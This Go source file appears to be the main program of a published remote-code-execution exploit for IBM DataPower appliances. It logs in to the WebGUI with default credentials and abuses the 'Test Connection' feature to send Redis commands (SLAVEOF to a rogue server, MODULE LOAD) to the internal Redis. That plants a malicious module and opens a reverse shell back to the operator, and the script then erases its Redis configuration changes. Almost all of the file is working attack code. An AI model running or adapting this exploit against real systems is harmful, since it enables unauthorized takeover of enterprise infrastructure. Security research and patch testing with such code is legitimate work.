package main

import (
	"crypto/tls"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path"
	"strconv"
	"strings"
	"time"
)

func main() {
	datapowerIP := flag.String("dpip", "", "Datapower IP Address")
	datapowerWebGUIPort := flag.Int("dpport", 9090, "Datapower WebGUI Port")
	datapowerWebGUIUsername := flag.String("dpwebguiuser", "admin", "Datapower WebGUI Username")
	datapowerWebGUIPassword := flag.String("dpwebguipassword", "admin", "Datapower WebGUI Password")
	datapowerRedisPassword := flag.String("dpredispasswd", "", "Datapower Internal Redis Password")
	datapowerRedisPort := flag.Int("dpredisport", 16379, "Datapower Internal Redis Port")
	datapowerRedisModule := flag.String("dpredismodule", "dpredisshell.so", "Redis Reverse Shell Module")
	localPort := flag.Int("fakeredisport", 8888, "Local port to run remote shell handler + fake redis server")
	localIPAddress := flag.String("fakeredisip", "", "local address to run remote shell handler + fake redis server")
	flag.Parse()
	if *datapowerIP == "" || *datapowerRedisPassword == "" || *localIPAddress == "" {
		log.Fatalln("Please make sure you specify all the required flags. Run with '-h' to see all tha flags.")
	}
	if _, err := os.Stat(*datapowerRedisModule); os.IsNotExist(err) {
		log.Fatalf("Redis Module '%s' does not exist. Please check you compiled it with 'make' and specified it's location with the '-dpredismodule' flag", *datapowerRedisModule)
	}
	log.SetPrefix("Main      - ")
	log.Println("datapower-redis-rce-exploit - Created by Thomas Cope")
	log.Printf("Starting Rogue Redis Server...")
	fakeRedisTimeoutChannel := make(chan bool, 1)
	fakeRedisShellChannel := make(chan net.Conn, 1)
	go FakeRedis(*localIPAddress, *localPort, fakeRedisTimeoutChannel, *datapowerRedisModule, fakeRedisShellChannel)
	log.Println("Attempting to Login to Datapower...")
	endpoint := fmt.Sprintf("https://%s:%d", *datapowerIP, *datapowerWebGUIPort)
	loginForm := url.Values{}
	loginForm.Set("user", *datapowerWebGUIUsername)
	loginForm.Set("pass", *datapowerWebGUIPassword)
	loginForm.Set("domain", "default")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //Note: Datapower WebGUI Certs are usually self signed.
	}
	client := &http.Client{Transport: tr}
	r, err := http.NewRequest("POST", endpoint+"/dp/sys.login", strings.NewReader(loginForm.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(loginForm.Encode())))
	res, err := client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpLoginBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	type DPLoginResponse struct {
		XMLName  xml.Name `xml:"response"`
		Text     string   `xml:",chardata"`
		Result   string   `xml:"result"`
		SAMLart  string   `xml:"SAMLart"`
		Location string   `xml:"location"`
	}
	var dpLoginResult DPLoginResponse
	err = xml.Unmarshal(dpLoginBody, &dpLoginResult)
	if err != nil {
		log.Fatal(err)
	}
	if dpLoginResult.Result != "success" {
		log.Fatalf("Datapower login failed. Bad XML Return Code - %v+", dpLoginResult)
	}
	log.Println("Datapower Credentials Valid!")
	log.Printf("Datapower Login Token = %s", dpLoginResult.SAMLart)
	log.Println("Exchanging Login token for auth cookie...")
	r, err = http.NewRequest("GET", fmt.Sprintf("%s/css/login.css?SAMLart=%s", endpoint, dpLoginResult.SAMLart), nil)
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	res, err = client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpLoginCookie := res.Cookies()
	log.Printf("Got login Cookie OK! - %v+", dpLoginCookie)
	log.Println("Datapower Login Complete!")
	log.Printf("Attempting Redis exploit via Datapower 'Test Connection' ...")
	redisExploit := fmt.Sprintf(`AUTH %s
CONFIG SET dbfilename %s
SLAVEOF %s %d`, *datapowerRedisPassword, path.Base(*datapowerRedisModule), *localIPAddress, *localPort)
	err = DPTestConnection(redisExploit, *datapowerRedisPort, dpLoginCookie, endpoint)
	if err != nil {
		log.Fatalf("Failed to perform redis exploit via Datapower 'Test Connection'. Error Message = %s", err.Error())
	}
	log.Printf("Datapower 'Test Connection' sent OK, waiting for redis connection...")
	select {
	case res := <-fakeRedisTimeoutChannel:
		if res == false {
			log.Fatal("Internal Error! Datapower internal redis failed to negotiate with fake redis server.")
		}
	case <-time.After(30 * time.Second):
		log.Fatal("Timeout! Datapower internal redis failed to connect to fake redis server after 30 seconds. Note: This can also occur if the redis password is incorrect.")
	}
	log.Printf("Payload has been delivered to Datapower internal redis!")
	log.Printf("Performing clean up...")
	cleanUpCommands := fmt.Sprintf(`AUTH %s
SLAVEOF NO ONE
CONFIG SET dbfilename dump.rdb`, *datapowerRedisPassword)
	err = DPTestConnection(cleanUpCommands, *datapowerRedisPort, dpLoginCookie, endpoint)
	if err != nil {
		log.Fatalf("Failed to perform cleanup via Datapower 'Test Connection'. Error Message = %s", err.Error())
	}
	log.Printf("Requesting Reverse Shell via Datapower 'Test Connection' ...")
	go func() {
		runReverseShell := fmt.Sprintf(`AUTH %s
MODULE LOAD ./%s
dpshell.go %s %d %s`, *datapowerRedisPassword, path.Base(*datapowerRedisModule), *localIPAddress, *localPort, path.Base(*datapowerRedisModule))
		DPTestConnection(runReverseShell, *datapowerRedisPort, dpLoginCookie, endpoint)
	}()
	log.Printf("Waiting for Reverse Shell...")
	select {
	case shellConnection := <-fakeRedisShellChannel:
		log.Printf("Got Reverse Shell!")
		log.Printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
		go func() {
			io.Copy(os.Stdin, shellConnection)
		}()
		io.Copy(shellConnection, os.Stdout)
	case <-time.After(30 * time.Second):
		log.Fatal("Timeout! Did not receive reverse shell connection.")
	}
}
